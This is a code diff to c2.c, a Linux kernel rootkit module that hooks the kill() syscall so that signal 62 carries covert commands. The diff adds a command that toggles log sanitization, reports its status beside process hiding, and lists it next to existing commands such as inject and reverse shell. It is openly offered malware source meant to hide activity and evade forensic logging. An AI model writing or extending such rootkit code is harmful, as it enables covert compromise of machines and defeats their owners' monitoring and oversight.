@@ -1,17 +1,6 @@
 /*
  * c2.c: covert C2 channel via kill() syscall hooking
- *
- * Implementation: when signal == MAGIC_SIGNAL (62), interpret the
- * call as a rootkit command and swallow it so the caller sees success
- * instead of a delivered signal.
- *
- * The kill syscall is an __arm64_sys_* wrapper: the real registers are
- * one level of indirection away (double pt_regs).
- *
- * Toggle commands are deferred: (un)registering hooks cannot happen
- * from inside a hook handler. Used schedule_toggle / schedule_inject /
- * schedule_add_gid, schedule_spawn below. CMD_TOGGLE_BLOCK is safe to handle directly
- * (it is just a flag flip, no hook registration involved).
+ * Toggle commands are deferred
  */
 
 #include <linux/module.h>
@@ -134,6 +123,14 @@ static void toggle_work_fn(struct work_struct *w)
 		}
 		break;
 	*/
+  case CMD_TOGGLE_LOG:
+    if (log_sanitize_is_active()) {
+      log_sanitize_disable();
+      pr_info("[C2] log sanitization OFF\n");
+    } else {
+      log_sanitize_enable();
+      pr_info("[C2] log sanitization ON\n");
+    }
 	}
 
 	kfree(tw);
@@ -197,6 +194,8 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
       */
       status = proc_hide_is_active();
       pr_info("[rootkit][status]    Process hiding-------+ %s\n", status ? "ENABLED" : "DISABLED");
+      status = log_sanitize_is_active();
+      pr_info("[rootkit][status]    Log Santization------+ %s\n", status ? "ENABLED" : "DISABLED");
       break;
     case CMD_TOGGLE_HIDE:
       schedule_toggle(CMD_TOGGLE_HIDE);
@@ -224,6 +223,9 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
     case CMD_REVSHELL:
       schedule_spawn();
       break;
+    case CMD_TOGGLE_LOG:
+      schedule_toggle(CMD_TOGGLE_LOG);
+      break;
     default:
       pr_warn("[C2][WARNING] unknown command %d\n", cmd);
       pr_info("[C2] usage: kill -62 <cmd>\n");
@@ -236,6 +238,7 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
       pr_info("[C2]   6 - inject\n");
       pr_info("[C2]   7 - revshell\n");
       pr_info("[C2]   8 - toggle symlink blocking\n");
+      pr_info("[C2]   9 - toggle log sanitization\n");
       break;
   }
 
